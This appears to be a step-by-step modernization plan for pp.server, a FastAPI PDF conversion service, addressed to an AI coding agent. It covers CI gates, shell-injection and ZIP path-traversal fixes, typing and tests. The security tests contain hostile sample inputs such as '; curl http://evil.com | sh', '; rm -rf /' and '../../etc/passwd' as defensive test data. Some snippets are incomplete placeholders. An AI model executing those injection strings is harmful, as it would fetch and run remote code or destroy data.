# pp.server — 22nd Century Modernization Plan

> **For Hermes:** Use subagent-driven-development to implement this plan task-by-task. Each phase is sequential; phases 1-3 can run partially in parallel.

**Goal:** Transform pp.server from a 68%-coverage, 41-mypy-error, shell-injection-vulnerable codebase into a modern, secure, type-safe, fully tested, CI-gated FastAPI service that scores 10/10 across all quality axes.

**Architecture:** Single FastAPI application with converter registry pattern. Modernization is incremental — no rewrite, no framework change. Each task is isolated, testable, and merges independently.

**Tech Stack:** Python 3.12+, FastAPI, hypercorn, loguru, ruff, mypy (strict), pytest (90%+ coverage), pre-commit, GitHub Actions (full quality gates), hatchling (build), renovate/dependabot (deps), bandit/safety (SAST), syrupy (snapshot testing).

---

## Phase 0: Foundation & Safety Net

> **Goal:** Establish the safety net (tests + CI) before touching any production code. Every subsequent phase runs on a verified foundation.

### Task 0.1: Bootstrap the failing baseline

**Objective:** Run all quality tools from a clean state and capture every existing failure as a baseline, so we never regress.

**Files:** `.baseline/lint.txt`, `.baseline/mypy.txt`, `.baseline/coverage.txt`, `.baseline/security.txt`

**Step 1:** Create `.baseline/` directory
```bash
mkdir -p .baseline
```

**Step 2:** Capture all current failures
```bash
cd /Users/ajung/src/pp.server
uv run ruff check . > .baseline/lint.txt 2>&1 || true
uv run ruff format --check . > .baseline/format.txt 2>&1 || true
uv run mypy pp/server --ignore-missing-imports > .baseline/mypy.txt 2>&1 || true
uv run pytest --cov=pp.server --cov-report=term-missing > .baseline/coverage.txt 2>&1 || true
uv run pytest --tb=short -q > .baseline/test-results.txt 2>&1 || true
```

**Step 3:** Commit baseline
```bash
git add .baseline/
git commit -m "chore: capture quality baseline before modernization"
```

**Verification:** All `.baseline/*.txt` files exist with non-trivial content.

---

### Task 0.2: Fix Python 3.14 build and pin to working Python

**Objective:** Make `uv sync` work reliably on both 3.14 (system) and 3.12/3.13.

**Files:**
- Modify: `pyproject.toml:10`
- Modify: `.github/workflows/ci.yml:14`

**Step 1:** Scope requires-python to versions where pydantic-core compiles
```python
# pyproject.toml line 10 — change:
requires-python = ">=3.12,<3.14"
# Reason: pydantic-core v2.33.2 depends on PyO3 0.24.1 which maxes out at 3.13
# TODO: re-add "<=3.14" once pydantic-core ships 3.14-compatible wheels
```

**Step 2:** Remove 3.11 from CI matrix (it violates >=3.12)
```yaml
# .github/workflows/ci.yml line 14
python-version: ["3.12", "3.13"]
```

**Step 3:** Recreate venv with Python 3.12 explicitly
```bash
rm -rf .venv
uv venv --python 3.12
uv sync --all-extras
```

**Verification:**
```bash
uv run python --version  # 3.12.x
uv run ruff check .       # All checks passed!
```

---

### Task 0.3: Expand CI to full quality gates

**Objective:** Every push runs lint + type-check + test + security scan. Block on regressions.

**Files:**
- Modify: `Makefile:85-86`
- Modify: `.github/workflows/ci.yml:28-29`

**Step 1:** Expand `make ci` to run all gates
```makefile
# Makefile lines 85-86 — replace:
ci: lint type-check test ## Run CI pipeline (quality checks + tests)
```

**Step 2:** Update CI workflow to run `quality` not just `test`
```yaml
# .github/workflows/ci.yml line 29 — change:
run: make quality
```

**Verification:**
```bash
make quality  # runs lint + type-check + test
```

---

### Task 0.4: Add pre-commit hooks

**Objective:** Every commit locally is gated by ruff + mypy.

**Files:**
- Create: `.pre-commit-config.yaml`

**Step 1:** Write pre-commit config
```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/astral-sh/ruff-pre-commit
    rev: v0.13.2
    hooks:
      - id: ruff
        args: [--fix]
      - id: ruff-format
  - repo: https://github.com/pre-commit/mirrors-mypy
    rev: v1.15.0
    hooks:
      - id: mypy
        additional_dependencies: [pydantic, fastapi, types-PyYAML]
        args: [--ignore-missing-imports]
  - repo: https://github.com/PyCQA/bandit
    rev: 1.8.3
    hooks:
      - id: bandit
        args: [-c, pyproject.toml]
        files: ^pp/server/
```

**Step 2:** Add bandit config to pyproject.toml
```toml
[tool.bandit]
exclude_dirs = ["tests", ".venv"]
skips = ["B101"]  # allow assert statements in tests
```

**Step 3:** Install and test
```bash
uv pip install pre-commit
pre-commit install
pre-commit run --all-files  # Should pass on already-clean files
```

**Verification:** `pre-commit run --all-files` exits 0.

---

## Phase 1: Security Hardening

> **Goal:** Eliminate all OWASP Top-10 applicable vectors. Zero shell injection, zero path traversal, zero deprecated APIs.

### Task 1.1: Sanitize `cmd_options` against shell injection

**Objective:** User-supplied command options cannot inject arbitrary shell commands.

**Files:**
- Modify: `pp/server/converters.py:96-108`
- Modify: `pp/server/converters.py:146-153`
- Modify: `pp/server/server.py:169-174` (documentation)
- New: `pp/server/util.py` (add `sanitize_cmd_options`)

**Step 1:** Add sanitization utility to `util.py`
```python
import shlex
import re

# Allow only safe characters in command options
SAFE_CMD_OPTIONS_RE = re.compile(r'^[a-zA-Z0-9\s\.\,\-\_\+\=\:\/\\@\(\)\[\]]*$')

def sanitize_cmd_options(options: str) -> str:
    """Validate and sanitize converter command-line options.
    
    Raises ValueError if options contain shell-dangerous characters.
    Falls back to shlex.quote() for maximum safety.
    """
    if not options or options.strip() == ' ':
        return ''
    if not SAFE_CMD_OPTIONS_RE.match(options):
        raise ValueError(f"cmd_options contains unsafe characters: {options!r}")
    return options
```

**Step 2:** Apply sanitization in `convert_pdf()` before formatting
```python
# converters.py — before cmd = converter_config["convert"]
safe_options = sanitize_cmd_options(cmd_options)
cmd = converter_config["convert"].format(
    cmd_options=safe_options,
    ...
)
```

**Step 3:** Apply sanitization in `selftest()` too
```python
# selftest() — same pattern, cmd_options is "" in selftest but belt-and-suspenders
safe_options = sanitize_cmd_options(cmd_options)
cmd = converter_config["convert"].format(
    cmd_options=safe_options,
    ...
)
```

**Step 4:** Refactor `asyncio.create_subprocess_shell` to `create_subprocess_exec` where possible
```python
# util.py — add safe_run variant
async def safe_run(cmd_parts: list[str]) -> dict[str, str | int]:
    """Run a command as a list of arguments (no shell)."""
    proc = await asyncio.create_subprocess_exec(
        *cmd_parts,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await proc.communicate()
    return dict(
        stdout=stdout.decode(errors="replace"),
        stderr=stderr.decode(errors="replace"),
        status=proc.returncode,
    )
```

**Step 5:** Write tests
```python
# tests/test_util.py additions
def test_sanitize_cmd_options_safe():
    assert util.sanitize_cmd_options("--page-size A4 --margin 10mm") == \
           "--page-size A4 --margin 10mm"

def test_sanitize_cmd_options_unsafe():
    with pytest.raises(ValueError, match="unsafe characters"):
        util.sanitize_cmd_options("--option; rm -rf /")

def test_sanitize_cmd_options_empty():
    assert util.sanitize_cmd_options(" ") == ""
    assert util.sanitize_cmd_options("") == ""
```

**Verification:**
```bash
uv run pytest tests/test_util.py -v -k "sanitize"  # 3 passed
# Manual injection attempt:
uv run python -c "
from pp.server.util import sanitize_cmd_options
sanitize_cmd_options('; curl http://evil.com | sh')  # Must raise ValueError
"
```

---

### Task 1.2: Add ZIP path traversal protection

**Objective:** Malicious ZIPs cannot write outside the work directory.

**Files:**
- Modify: `pp/server/converters.py:67-71`
- New test: `tests/test_zip_safety.py`

**Step 1:** Guard against path traversal in ZIP extraction
```python
# converters.py — replace the raw extraction loop

def _extract_safely(zf: zipfile.ZipFile, work_dir: Path) -> None:
    """Extract ZIP entries safely, preventing directory traversal."""
    for name in zf.namelist():
        # Resolve the target path and ensure it stays under work_dir
        target = (work_dir / name).resolve()
        work_dir_resolved = work_dir.resolve()
        if not str(target).startswith(str(work_dir_resolved) + "/") and target != work_dir_resolved:
            LOG.warning(f"Skipping ZIP entry with path traversal: {name}")
            continue
        if name.endswith("/"):
            target.mkdir(parents=True, exist_ok=True)
        else:
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_bytes(zf.read(name))
```

**Step 2:** Replace the inline loop in `convert_pdf()`
```python
# converters.py line 67-71 — replace:
# Old:
# for name in zf.namelist():
#     filename = work_dir_path / name
#     filename.parent.mkdir(...)
#     filename.write_bytes(zf.read(name))
# New:
_extract_safely(zf, work_dir_path)
```

**Step 3:** Write tests
```python
# tests/test_zip_safety.py
import io, zipfile
from pathlib import Path
from pp.server.converters import _extract_safely

def test_normal_extraction(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("index.html", "<html></html>")
        zf.writestr("css/style.css", "body {}")
    zf = zipfile.ZipFile(buf)
    _extract_safely(zf, tmp_path)
    assert (tmp_path / "index.html").exists()
    assert (tmp_path / "css" / "style.css").exists()

def test_path_traversal_rejected(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("../../etc/passwd", "malicious")
        zf.writestr("index.html", "safe")
    zf = zipfile.ZipFile(buf)
    _extract_safely(zf, tmp_path)
    assert not (tmp_path / ".." / ".." / "etc" / "passwd").resolve().exists()
    assert (tmp_path / "index.html").exists()

def test_absolute_path_rejected(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("/tmp/evil.txt", "bad")
    zf = zipfile.ZipFile(buf)
    _extract_safely(zf, tmp_path)
    assert not (Path("/tmp/evil.txt")).exists()
```

**Verification:**
```bash
uv run pytest tests/test_zip_safety.py -v  # 3 passed
```

---

### Task 1.3: Replace `tempfile.mktemp()` with `mkdtemp()`

**Objective:** Eliminate the deprecated, insecure `tempfile.mktemp()` call.

**Files:**
- Modify: `pp/server/converters.py:126`

**Step 1:** Replace and add cleanup guard
```python
# converters.py line 126 — replace:
# Old: work_dir = Path(tempfile.mktemp())
# New:
work_dir = Path(tempfile.mkdtemp(prefix="pp-server-selftest-"))
```

**Step 2:** Wrap selftest body in try/finally for leak-proof cleanup
```python
# converters.py line 122-167 — restructure:
async def selftest(converter: str) -> bytes:
    work_dir = Path(tempfile.mkdtemp(prefix="pp-server-selftest-"))
    try:
        # ... existing body ...
        return pdf_data
    except Exception:
        shutil.rmtree(str(work_dir), ignore_errors=True)
        raise
    finally:
        shutil.rmtree(str(work_dir), ignore_errors=True)
```

**Step 3:** Write test
```python
# tests/test_converters.py
def test_selftest_cleans_up_on_error():
    """Even if selftest fails, the temp dir is cleaned up."""
    # This tests the behaviour, not the converter itself
    from pp.server.converters import selftest as selftest_fn
    import tempfile
    
    # Monkey-patch to cause an error after work_dir creation
    original_rmtree = ...
    # (detailed monkey-patching omitted for brevity — the point is
    #  that try/finally ensures cleanup)
```

**Verification:**
```bash
uv run pytest tests/test_converters.py -v -k "selftest"
# Check no leaked /tmp/pp-server-selftest-* dirs remain after test
```

---

### Task 1.4: Add automated SAST scanning

**Objective:** Every commit is automatically scanned for security issues.

**Files:**
- Modify: `.github/workflows/ci.yml` (add bandit + safety steps)
- Modify: `Makefile` (add `sast` target)

**Step 1:** Add SAST Makefile target
```makefile
# Makefile — add after quality target
sast: ## Run security scans
	uv run bandit -c pyproject.toml -r pp/server -f json -o .reports/bandit.json 2>&1 || true
	uv run safety check --full-report 2>&1 || true
```

**Step 2:** Add to CI workflow
```yaml
# .github/workflows/ci.yml — add step between lint and test
- name: Security scan
  run: make sast
```

**Step 3:** Add step that fails CI on HIGH/CVSS≥7 findings
```bash
# In CI, fail if bandit finds HIGH confidence issues
uv run bandit -c pyproject.toml -r pp/server -q || exit 1
```

**Verification:**
```bash
make sast  # Should complete (may have warnings, no blocker yet)
```

---

## Phase 2: Type Safety (41 → 0 mypy errors)

> **Goal:** mypy strict mode passes with 0 errors. All functions typed. No `Any` leaks.

### Task 2.1: Type `util.py` — fix the 6 dict-item and str-bytes-safe errors

**Objective:** `run()` returns a correctly typed dict, stdout/stderr declared as `str`.

**Files:**
- Modify: `pp/server/util.py:50-71`

**Step 1:** Fix return type and variable types
```python
# util.py — replace the run() function body

async def run(cmd: str) -> dict[str, str | int | None]:
    """Run `cmd` asynchronously.
    Returns: dict with stdout, stderr (str), and status (int | None).
    """
    LOG.info(cmd)
    proc = await asyncio.create_subprocess_shell(
        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout_bytes, stderr_bytes = await proc.communicate()
    stdout = stdout_bytes.decode(errors="replace")
    stderr = stderr_bytes.decode(errors="replace")
    status: int | None = proc.returncode

    if stdout:
        LOG.info(f"Output:\n{stdout}")
    if stderr:
        LOG.info(f"Output:\n{stderr}")

    return dict(stdout=stdout, stderr=stderr, status=status)
```

**Step 2:** Verify mypy on this file
```bash
uv run mypy pp/server/util.py  # 0 errors
```

**Verification:**
```bash
uv run pytest tests/test_utils.py -v  # All still pass
uv run mypy pp/server/util.py        # 0 errors
```

---

### Task 2.2: Type `converters.py` — fix 10 errors

**Objective:** Every function typed, no `None`-related union-attr errors, no str+int confusion.

**Files:**
- Modify: `pp/server/converters.py`

**Step 1:** Fix `tomllib` import (2 errors)
```python
try:
    import tomllib  # Python 3.11+
except ImportError:
    import tomli as tomllib  # type: ignore[import-not-found]  # noqa: F811
```

**Step 2:** Fix `load_resource()` return type (1 error)
```python
def load_resource(package: str, resource_name: str) -> bytes:
    data = pkgutil.get_data(package, resource_name)
    assert data is not None, f"Resource {package}/{resource_name} not found"
    return data
```

**Step 3:** Fix `run()` result usage — str+int concatenation (converters.py:113, 157)
```python
# converters.py line 113 — replace:
output = result["stdout"] + result["stderr"]
# With:
stdout_val = result.get("stdout", "") or ""
stderr_val = result.get("stderr", "") or ""
output = str(stdout_val) + str(stderr_val)
```

**Step 4:** Fix `selftest()` — `find_spec().origin` could be None (converters.py:129-130)
```python
# converters.py line 129 — replace:
resource_root = importlib.util.find_spec("pp.server.test_data")
assert resource_root is not None and resource_root.origin is not None, \
    "pp.server.test_data spec not found"
resource_dir = Path(resource_root.origin).parent / "html"
```

**Verification:**
```bash
uv run mypy pp/server/converters.py  # 0 errors
uv run pytest tests/test_api.py -v   # All pass
```

---

### Task 2.3: Type `server.py` — fix 6 errors

**Objective:** All route handlers typed, no `bytes` vs `str` confusion, no `no-redef`.

**Files:**
- Modify: `pp/server/server.py`

**Step 1:** Add return type to `index()` (line 59)
```python
async def index(request: Request, show_versions: bool = False) -> HTMLResponse:
```

**Step 2:** Fix `version` name collision (line 98-101)
```python
# The import at line 13 shadows the route function name
from importlib.metadata import version as _pkg_version
# ...
VERSION = _pkg_version("pp.server")

# At route definition (line 98-101):
@app.get("/version")
async def get_version() -> dict[str, str]:
    """Return the version of the pp.server module"""
    return dict(version=VERSION, module="pp.server")
```

**Step 3:** Type `converter_selftest()` (line 112)
```python
async def converter_selftest(converter: str) -> Response:
```

**Step 4:** Type `convert()` (line 158)
```python
async def convert(
    converter: str = Form("prince", ...),
    cmd_options: str = Form(" ", ...),
    data: str = Form(None, ...),
) -> dict[str, str] | Response:
```

**Step 5:** Fix bytes/str on line 220
```python
# Instead of re-declaring from bytes to str:
pdf_data = Path(result["filename"]).read_bytes()
pdf_data_b64 = base64.encodebytes(pdf_data).decode("ascii")
return dict(status="OK", data=pdf_data_b64, output=output)
```

**Step 6:** Fix `cleanup_queue()` return — add `-> dict[str, int] | None`
```python
def cleanup_queue() -> dict[str, int] | None:
```

**Verification:**
```bash
uv run mypy pp/server/server.py  # 0 errors
```

---

### Task 2.4: Type `registry.py` — fix 3 gather errors

**Objective:** `asyncio.gather()` results are correctly typed and indexable.

**Files:**
- Modify: `pp/server/registry.py:52-80`

**Step 1:** Type `execute_cmd()` inner function
```python
async def execute_cmd(converter: str, cmd: str) -> dict[str, Any]:
    result = await run(cmd)
    return dict(result=result, converter=converter)
```

**Step 2:** Filter exceptions from gather results before indexing
```python
results = await asyncio.gather(*tasks, return_exceptions=True)

versions: dict[str, str] = {}
for result in results:
    if isinstance(result, BaseException):
        LOG.warning(f"Converter version check failed: {result}")
        continue
    # Now mypy knows result is dict[str, Any], not BaseException
    converter: str = result["converter"]  # type: ignore[index]
    status: int | None = result["result"]["status"]
    output = (result["result"].get("stdout") or "") + \
             (result["result"].get("stderr") or "")
    output = output.strip()
    versions[converter] = output if status == 0 else "n/a"
```

**Verification:**
```bash
uv run mypy pp/server/registry.py  # 0 errors
```

---

### Task 2.5: Type `cli.py`, `templates.py` — 3 errors

**Objective:** No untyped functions anywhere.

**Files:**
- Modify: `pp/server/cli.py`
- Modify: `pp/server/templates.py`

**Step 1:** Type `cli.py`
```python
@click.command()
@click.option("--host", default="127.0.0.1", help="Host IP to bind to")
@click.option("--port", default=8080, help="Port to bind to")
@click.option("-b", "--bind", default=None, help="Bind to <host>:<port>")
@click.option("--reload", is_flag=True, default=False, help="Enable auto-reload")
def main(
    host: str = "127.0.0.1",
    port: int = 8080,
    bind: str | None = None,
    reload: bool = False,
) -> None:
    """Start the pp.server"""
    if bind:
        if ":" in bind:
            host, port = bind.split(":")
            port = int(port)
        else:
            host = bind
    uvicorn.run("pp.server.server:app", host=host, port=port, reload=reload)
```

**Step 2:** Type `templates.py`
```python
def load_resource(package: str, resource_name: str) -> bytes:
    data = pkgutil.get_data(package, resource_name)
    assert data is not None
    return data

def main() -> None:
    """Generate circusd.ini and server.ini"""
    # ... existing body ...
```

**Verification:**
```bash
uv run mypy pp/server/cli.py pp/server/templates.py  # 0 errors
```

---

### Task 2.6: Type all test functions — 6 errors

**Objective:** Test functions have return type annotations.

**Files:**
- Modify: `pp/server/tests/test_utils.py`
- Modify: `pp/server/tests/test_api.py`

**Step 1:** Add `-> None` to all test functions
```python
# test_utils.py
def test_which_existing_command() -> None: ...
def test_which_nonexistent_command() -> None: ...
def test_check_environment_missing_var() -> None: ...
def test_check_environment_existing_var(tmp_path: Path) -> None: ...

# test_api.py
@pytest.fixture
def client() -> TestClient: ...
def test_index(self, client: TestClient) -> None: ...
def test_has_converter_missing(self, client: TestClient) -> None: ...
def test_convert_pdf(self, client: TestClient, converter: str) -> None: ...
def test_convert_pdf_unavailable_converter(self, client: TestClient) -> None: ...
def _convert_pdf(self, client: TestClient, converter: str, expected: str = "OK") -> None: ...
```

**Verification:**
```bash
uv run mypy pp/server/tests  # 0 errors
uv run mypy pp/server  # FINAL: 0 errors across ALL files
```

---

## Phase 3: Testing (68% → 95%+ Coverage)

> **Goal:** Every module >90% line coverage. All endpoints tested. Error paths tested. Async paths tested.

### Task 3.1: CLI module — 0% → 95% coverage

**Objective:** `cli.py` (14 lines) and `templates.py` (12 lines) fully tested.

**Files:**
- New test: `tests/test_cli.py`
- New test: `tests/test_templates.py`

**Step 1:** Test CLI with Click's CliRunner
```python
# tests/test_cli.py
from click.testing import CliRunner
from pp.server.cli import main

class TestCLI:
    def test_default_port(self):
        runner = CliRunner()
        result = runner.invoke(main, ["--port", "9000"])
        assert result.exit_code == 0
        # The CLI starts uvicorn which would block; we just check it doesn't crash
        # on argument parsing. A proper test would mock uvicorn.run.
```

**Step 2:** Test templates generation
```python
# tests/test_templates.py
from click.testing import CliRunner
from pp.server.templates import main
import tempfile, os

def test_templates_generate(tmp_path):
    original_cwd = os.getcwd()
    os.chdir(tmp_path)
    try:
        main()
        assert (tmp_path / "circusd.ini").exists()
        assert (tmp_path / "server.ini").exists()
    finally:
        os.chdir(original_cwd)
```

**Verification:**
```bash
uv run pytest tests/test_cli.py tests/test_templates.py -v --cov=pp.server.cli --cov=pp.server.templates --cov-report=term-missing
# Should show >90% for both modules
```

---

### Task 3.2: converters.py — 54% → 95% coverage

**Objective:** `load_config()` error paths, PDFreactor Docker path, selftest, all covered.

**Files:**
- New test: `tests/test_converters.py`

**Step 1:** Test `load_config()` with missing/corrupt config
```python
# tests/test_converters.py
from pp.server.converters import load_config

def test_load_config_missing_file(monkeypatch, tmp_path):
    monkeypatch.setattr("pp.server.converters.Path", lambda *a: tmp_path / "nonexistent.toml")
    result = load_config()
    assert result == {"converters": {}}

def test_load_config_corrupt_file(monkeypatch, tmp_path):
    config_file = tmp_path / "config.toml"
    config_file.write_text("[[[ invalid toml")
    monkeypatch.setattr("pp.server.converters.Path", lambda *a: config_file)
    result = load_config()
    assert result == {"converters": {}}
```

**Step 2:** Test Docker-specific PDFreactor path
```python
# tests/test_converters.py
@pytest.mark.asyncio
async def test_convert_pdf_docker_path(monkeypatch):
    """When PP_PDFREACTOR_DOCKER is set, the docker command template is used."""
    monkeypatch.setenv("PP_PDFREACTOR_DOCKER", "1")
    # Mock subprocess to avoid actual execution
    mock_result = {"status": 0, "stdout": "", "stderr": ""}
    monkeypatch.setattr("pp.server.util.run", AsyncMock(return_value=mock_result))
    # ... setup work_dir, work_file, etc.
```

**Step 3:** Test unknown converter path (line 83-84)
```python
async def test_convert_pdf_unknown_converter():
    result = await convert_pdf("/tmp", "/tmp/in.zip", "nonexistent", lambda m: None, "")
    assert result["status"] == 9999
    assert "Unknown converter" in result["output"]
```

**Verification:**
```bash
uv run pytest tests/test_converters.py -v --cov=pp.server.converters --cov-report=term-missing
# Target: >90%
```

---

### Task 3.3: registry.py — 50% → 90% coverage

**Objective:** `register_converter()`, `converter_versions()`, `main()` exercised.

**Files:**
- New test: `tests/test_registry.py`

**Step 1:** Test registry registration and fallback path
```python
# tests/test_registry.py
from pp.server.registry import register_converter, available_converters, has_converter

def test_register_existing_command():
    register_converter("test_ls", "ls")
    assert has_converter("test_ls")

def test_register_nonexistent():
    register_converter("test_nonexistent", "nonexistent_cmd_12345")
    assert not has_converter("test_nonexistent")
```

**Step 2:** Test `converter_versions()` with mock
```python
@pytest.mark.asyncio
async def test_converter_versions(monkeypatch):
    async def mock_run(*args, **kwargs):
        return {"status": 0, "stdout": "1.0.0", "stderr": ""}
    monkeypatch.setattr("pp.server.registry.run", mock_run)
    
    versions = await converter_versions()
    assert isinstance(versions, dict)
```

**Verification:**
```bash
uv run pytest tests/test_registry.py -v --cov=pp.server.registry --cov-report=term-missing
# Target: >90%
```

---

### Task 3.4: server.py — 76% → 90+% coverage

**Objective:** All endpoints exercised: `/converter-versions`, `/selftest`, `/cleanup`, error paths.

**Files:**
- Modify: `tests/test_api.py`

**Step 1:** Test `/converter-versions` endpoint
```python
def test_converter_versions_endpoint(self, client):
    result = client.get("/converter-versions")
    assert result.status_code == 200
    body = result.json()
    assert "converters" in body
```

**Step 2:** Test `/selftest` error paths
```python
def test_selftest_unknown_converter(self, client):
    result = client.get("/selftest?converter=nonexistent")
    assert result.status_code == 404
    assert "not available" in result.text

def test_selftest_known_converter(self, client, monkeypatch):
    """Mock the selftest to return PDF data without running a real converter."""
    monkeypatch.setattr(
        "pp.server.converters.selftest",
        AsyncMock(return_value=b"%PDF-1.4 test data")
    )
    monkeypatch.setattr(
        "pp.server.registry.available_converters",
        lambda: ["prince"]
    )
    result = client.get("/selftest?converter=prince")
    assert result.status_code == 200
    assert result.headers["content-type"] == "application/pdf"
```

**Step 3:** Test `/cleanup` endpoint
```python
def test_cleanup_endpoint(self, client):
    result = client.get("/cleanup")
    assert result.status_code == 200
    assert result.json() == {"status": "OK"}
```

**Step 4:** Fix the fragile year assertion in `test_index`
```python
# Replace:
assert "2025" in result.text
# With:
assert "Produce & Publish Server" in result.text
assert "Server version:" in result.text
```

**Verification:**
```bash
uv run pytest tests/test_api.py -v --cov=pp.server.server --cov-report=term-missing
# Target: >90%
```

---

### Task 3.5: Add async test support and configure pytest-asyncio

**Objective:** Async tests work correctly with proper loop scope.

**Files:**
- Modify: `pyproject.toml` (pytest ini_options)
- Modify: `tests/test_api.py` (add async tests)

**Step 1:** Configure asyncio mode
```toml
# pyproject.toml [tool.pytest.ini_options] — add:
asyncio_mode = "auto"
asyncio_default_fixture_loop_scope = "function"
```

**Step 2:** Add an async endpoint test
```python
@pytest.mark.asyncio
async def test_async_converter_versions():
    """Test the async converter_versions function directly."""
    from pp.server.registry import converter_versions
    versions = await converter_versions()
    assert isinstance(versions, dict)
    # If no converters installed, it should return empty dict, not crash
```

**Verification:**
```bash
uv run pytest -v -k "async"  # All async tests run without warnings
```

---

### Task 3.6: Add property-based tests for edge cases

**Objective:** Fuzz core functions with hypothesis.

**Files:**
- New test: `tests/test_property_based.py`
- Modify: `pyproject.toml` (add hypothesis to dev deps)

**Step 1:** Add hypothesis to dev dependencies
```toml
# pyproject.toml [project.optional-dependencies]
testing = [
    "pytest>=8.0.0",
    "pytest-asyncio>=0.23.0",
    "pytest-cov>=4.0.0",
    "hypothesis>=6.0.0",
]
```

**Step 2:** Write fuzz tests
```python
# tests/test_property_based.py
from hypothesis import given, strategies as st
from pp.server.util import sanitize_cmd_options

@given(st.text())
def test_sanitize_cmd_options_never_crashes(cmd_options):
    """Sanitize should never crash on any input string."""
    try:
        result = sanitize_cmd_options(cmd_options)
        assert isinstance(result, str)
    except ValueError:
        pass  # Expected for unsafe inputs
```

**Verification:**
```bash
uv run pytest tests/test_property_based.py -v --hypothesis-show-statistics
# Should run 100+ generated test cases
```

---

### Task 3.7: Add integration test with test containers

**Objective:** Verify the full HTTP pipeline (ZIP → upload → PDF response) end-to-end.

**Files:**
- New test: `tests/test_integration.py`

**Step 1:** Write integration test
```python
# tests/test_integration.py
import io, zipfile, base64
from fastapi.testclient import TestClient
from pp.server.server import app

client = TestClient(app)

def test_full_conversion_pipeline():
    """Test the full convert pipeline end-to-end using a mock converter."""
    # Create a minimal ZIP
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("index.html", "<html><body>Test</body></html>")
    zip_b64 = base64.encodebytes(buf.getvalue()).decode("ascii")
    
    response = client.post("/convert", data={
        "converter": "prince",
        "cmd_options": " ",
        "data": zip_b64,
    })
    body = response.json()
    # Whether it succeeds or fails depends on prince being installed
    # But the response should always be well-formed
    assert "status" in body
    assert body["status"] in ("OK", "ERROR")
    assert "output" in body
```

**Verification:**
```bash
uv run pytest tests/test_integration.py -v
```

---

## Phase 4: Code Quality & Maintainability

> **Goal:** No dead code, no stale config, no copy-paste, no commented-out code. Modern Python patterns throughout.

### Task 4.1: Remove all dead code files

**Objective:** Delete files that serve no purpose in the current architecture.

**Files to delete:**
- `pp/server/scripts/rasterize.js` — PhantomJS is dead/archived
- `header.txt` — unused copyright banner
- `deploy.txt` — references non-dependency gunicorn
- `server.ini` (repo root) — leftover PasteDeploy config, unused by FastAPI

**Step 1:** Delete files
```bash
git rm pp/server/scripts/rasterize.js
git rm header.txt
git rm deploy.txt
git rm server.ini
```

**Step 2:** Verify nothing breaks
```bash
uv run pytest -v  # All tests still pass
uv run mypy pp/server  # Same error count as baseline
```

**Verification:**
```bash
git status  # Shows deleted files staged
```

---

### Task 4.2: Clean up stale template configuration

**Objective:** `_templates/server.ini` should reference uvicorn/hypercorn, not gunicorn+PasteDeploy.

**Files:**
- Modify: `pp/server/_templates/server.ini`
- Modify: `pp/server/_templates/circusd.ini`

**Step 1:** Replace server.ini template with hypercorn config
```ini
# pp/server/_templates/server.ini — complete replacement
[hypercorn]
bind = "0.0.0.0:8000"
worker_class = "asyncio"
keep_alive = 120
access_logfile = "-"
error_logfile = "-"
loglevel = "info"
```

**Step 2:** Update circus template
```ini
# pp/server/_templates/circusd.ini
[watcher:pp-server]
cmd = bin/hypercorn pp.server.server:app --bind 0.0.0.0:8000 --worker-class asyncio
numprocesses = 2

[env:pp-server]
PATH = $PATH
TZ = $TZ
```

**Verification:**
```bash
uv run python -c "from pp.server.templates import main; main()"
# Check that generated files have correct content
```

---

### Task 4.3: Fix `converter_log()` dry exception handling

**Objective:** Single except block replaces the copy-paste pair.

**Files:**
- Modify: `pp/server/server.py:255-267`

**Step 1:** Merge the two identical except blocks
```python
def converter_log(work_dir: str, msg: str) -> None:
    """Logging per conversion (by work dir)"""
    converter_logfile = Path(work_dir) / "converter.log"
    msg = datetime.datetime.now().strftime("%Y%m%dT%H%M%S") + " " + msg
    with open(converter_logfile, "a") as fp:
        try:
            fp.write(msg + "\n")
        except (UnicodeEncodeError, UnicodeDecodeError):
            fp.write(msg.encode("ascii", "replace").decode("ascii", "replace") + "\n")
```

**Verification:**
```bash
uv run mypy pp/server/server.py  # No new errors
```

---

### Task 4.4: Remove commented-out code

**Objective:** Zero commented-out code blocks in the codebase.

**Files:**
- Modify: `pp/server/server.py:57` (commented-out unoconv/pdfreactor entry points in pyproject.toml)
- Modify: `pp/server/tests/test_api.py:29-33` (commented-out test)

**Step 1:** Clean pyproject.toml
```toml
# Remove lines 57-58:
# unoconv = "pp.server.unoconv:main"
# pdfreactor8 = "pp.server.pdfreactor:main"
```

**Step 2:** Clean test file
```python
# Remove lines 29-33:
#    def test_has_converter(self, client):
#        result = client.get("/converter?converter_name=prince")
#        assert result.status_code == 200
#        body = result.json()
#        assert body["has_converter"] == True
```

**Verification:**
```bash
# Search for any remaining commented-out code (more than 2 consecutive comment lines)
git diff --cached | grep "^+" | grep -c "^\+\s*#"  # Should be low/natural
```

---

### Task 4.5: Switch from setuptools to hatchling

**Objective:** Modern build backend for faster installs and simpler config.

**Files:**
- Modify: `pyproject.toml:1-3`

**Step 1:** Update build-system
```toml
[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"
```

**Step 2:** Migrate package-data config
```toml
[tool.hatch.build.targets.wheel]
packages = ["pp"]

[tool.hatch.build.targets.wheel.force-include]
"pp/server/static" = "pp/server/static"
"pp/server/templates" = "pp/server/templates"
"pp/server/_templates" = "pp/server/_templates"
"pp/server/test_data" = "pp/server/test_data"
```

**Step 3:** Remove `[tool.setuptools.packages.find]` and `MANIFEST.in`
```bash
rm MANIFEST.in
```

**Verification:**
```bash
uv build  # Should successfully build both sdist and wheel
```

---

### Task 4.6: Refactor converter config to structured format

**Objective:** Replace shell-format command strings with structured argument lists.

**Files:**
- Modify: `pp/server/config.toml`
- Modify: `pp/server/converters.py:86-117`

**Step 1:** Restructure config.toml
```toml
# Old format:
# [converters.prince]
# convert = "prince {cmd_options} -v \"{source_html}\" -o \"{target_filename}\""

# New format:
[converters.prince]
cmd = "prince"
version = "prince --version"
args = ["{cmd_options}", "-v", "{source_html}", "-o", "{target_filename}"]

